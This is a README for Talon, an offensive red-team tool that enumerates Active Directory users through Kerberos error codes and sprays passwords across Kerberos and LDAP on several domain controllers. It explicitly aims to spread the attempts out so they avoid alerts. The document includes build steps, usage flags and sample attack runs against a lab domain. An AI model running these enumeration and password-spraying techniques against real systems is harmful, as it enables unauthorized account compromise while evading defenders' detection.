

<h1 align="center">
<br>
<img src=Screenshots/Talon.png>
<br>
</h1>

# Talon


Talon is a tool designed to perform automated password guessing attacks while remaining undetected. Talon can enumerate a list of users to identify which users are valid, using Kerberos. Talon can also perform a password guessing attack against the Kerberos and LDAPS (LDAP Secure) services. Talon can either use a single domain controller or multiple ones to perform these attacks, randomizing each attempt, between the domain controllers and services (LDAP or Kerberos).

More info about the techniques can be found on the following [Blog](https://www.optiv.com/explore-optiv-insights/blog/digging-your-talons-new-take-password-guessing) 

## Usage
Download release for your OS from [releases](https://github.com/optiv/Talon/releases)

## Contributing
Talon was developed in golang.

The first step as always is to clone the repo. Before you compile Talon you'll need to install the dependencies. To install them, run following commands:
```
go get github.com/fatih/color
go get gopkg.in/jcmturner/gokrb5.v7/client
go get gopkg.in/jcmturner/gokrb5.v7/config
go get gopkg.in/jcmturner/gokrb5.v7/iana/etypeID
go get gopkg.in/ldap.v2
```
Then build it

```
go build Talon.go
```

## Usage

```
$ ./Talon -h
Usage of ./Talon:
  -D string
    	Fully qualified domain to use
  -E	Enumerates which users are valid
  -H string
    	Domain controller to connect to
  -Hostfile string
    	File containing the list of domain controllers to connect to
  -K	Test against Kerberos only
  -L	Test against LDAP only
  -O string
    	File to append the results to
  -P string
    	Password to use
  -U string
    	Username to authenticate as
  -Userfile string
    	File containing the list of usernames
  -debug
    	Print debug statements
  -sleep float
    	Time inbetween attempts (default 0.5)
```


## Enumeration Mode
User enumeration mode can be executed with the `-E` flag which will send only Kerberos TGT pre-authentication request to the target KDC, however, this request is sent with a known bad or no longer supported encryption type.  Talon reviews the response by the KDC to determine if responds with a `KDC_ERR_ETYPE_NOSUPP`, which indicates if a user exists or `KDC_ERR_C_PRINCIPAL_UNKNOWN` if it does not. Talon can perform this type of enumeration against multiple domain controllers in an enterprise using the `-Hostfile` command to specify multiple domain controllers, or a single domain controller using `-H`. Using this technique will not cause any login failures so it will not lock out any of the users.

```
./Talon -D STARLABS.LOCAL -Hostfile DCs -Userfile Users -sleep 1 -E 

  __________  ________  ___       ________  ________
  |\___    _\\\   __  \|\  \     |\   __  \|\   ___  \
  \|___ \  \_\ \  \|\  \ \  \    \ \  \|\  \ \  \\ \  \
       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \  \\ \  \
        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \ \  \\ \  \
         \ \__\ \ \__\ \__\ \_______\ \_______\ \__\\ \__\
          \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
					          (@Tyl0us)


[-]  172.16.144.195 STARLABS.LOCAL\asmith:  = User Does Not Exist
[+]  172.16.144.185 STARLABS.LOCAL\ballen:  = User Exist
[-]  172.16.144.186 STARLABS.LOCAL\bjohnson:  = User Does Not Exist
[-]  172.16.144.195 STARLABS.LOCAL\bwayne:  = User Does Not Exist
[+]  172.16.144.195 STARLABS.LOCAL\csnow:  = User Exist
[-]  172.16.144.186 STARLABS.LOCAL\jtodd:  = User Does Not Exist
[+]  172.16.144.186 STARLABS.LOCAL\hwells:  = User Exist
[-]  172.16.144.186 STARLABS.LOCAL\wwest:  = User's Account Locked
```

## Automated Password Guessing Mode
Talon utilize Kerberos and LDAP, which are both integrated into Active Directory for authentication. Talon can perform password guessing by alternating between the two services, allowing the password attack traffic to be split across two protocols. This splits the number of potential events generated, as a result reducing the chance of an alert. Talon takes this one step further, by distributing a password attack against multiple domain controllers in an enterprise using the `-Hostfile`, alternating between LDAP and Kerberos each time to create an additional layer of obscurity. A single domain controller can be provided using in the `-H` command if needed.

```
./Talon -D STARLABS.LOCAL -Hostfile DCs -Userfile ValidUsers -P "Not3vil" -sleep 1

  __________  ________  ___       ________  ________
  |\___    _\\\   __  \|\  \     |\   __  \|\   ___  \
  \|___ \  \_\ \  \|\  \ \  \    \ \  \|\  \ \  \\ \  \
       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \  \\ \  \
        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \ \  \\ \  \
         \ \__\ \ \__\ \__\ \_______\ \_______\ \__\\ \__\
          \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
					          (@Tyl0us)

                
[-]  172.16.144.186 STARLABS.LOCAL\admin:Not3vil = Failed
[-]  172.16.144.185 STARLABS.LOCAL\ballen:Not3vil = Failed
[-]  172.16.144.195 STARLABS.LOCAL\cramon:Not3vil = Failed
[+]  172.16.144.185 STARLABS.LOCAL\hwells:Not3vil = Success
[-]  172.16.144.195 STARLABS.LOCAL\ssmith:Not3vil = Failed
```

Talon is designed to be versitale given any siutaiton as a result, if only Kerberose is available, Talon can be set to only attack against Kerberos using the `-K` flag or only LDAP using the `-L` flag.

Talon can use both Kerberos and LDAP to read the responses as we perform a password guessing attack. Talon can detect account lockouts during an active password guessing attack by reading the response code from each password attempt. This can help prevent any unwanted account locks acorss a enterprise, helping you to remain undetected. Simply follow the prompt to quit or continue the attack.

```
root@kali:~# ./Talon -Hostfile DCs -Userfile ValidUsers -D STARLABS.local -P "Password!" -sleep 2

  __________  ________  ___       ________  ________
  |\___    _\\\   __  \|\  \     |\   __  \|\   ___  \
  \|___ \  \_\ \  \|\  \ \  \    \ \  \|\  \ \  \\ \  \
       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \  \\ \  \
        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \ \  \\ \  \
         \ \__\ \ \__\ \__\ \_______\ \_______\ \__\\ \__\
          \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
					          (@Tyl0us)


[-]  172.16.144.186 STARLABS.LOCAL\ballen:Password! = Failed
[-]  172.16.144.185 STARLABS.LOCAL\csnow:Password! = Failed
[-]  172.16.144.186 STARLABS.LOCAL\wwest:Password! = User's Account Locked
[*] Account lock out detected - Do you want to continue.[y/n]:
```

### Troubleshooting
Talon comes equip to detect if the  targeted domain controllers are activy or become unavialble. This helps ensure your getting accurate results while not wasting time. 


```
root@kali:~# ./Talon -H 172.14.15.1 -Userfile ValidUsers -D STARLABS.local -P "Frosty20" -sleep 2

  __________  ________  ___       ________  ________
  |\___    _\\\   __  \|\  \     |\   __  \|\   ___  \
  \|___ \  \_\ \  \|\  \ \  \    \ \  \|\  \ \  \\ \  \
       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \  \\ \  \
        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \ \  \\ \  \
         \ \__\ \ \__\ \__\ \_______\ \_______\ \__\\ \__\
          \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
					          (@Tyl0us)


[Root cause: Networking_Error] Networking_Error: AS Exchange Error: failed sending AS_REQ to KDC: failed to communicate with KDC 172.14.15.1
[*] Do you want to continue.[y/n]:
```



##### Changelog
* Published  on 04/09/2018
* Version 1.2 released 02/14/2019
* Version 1.3 released 05/03/2019
* Version 1.4 released 03/17/2020
* Version 2.0 public relase 06/18/2020
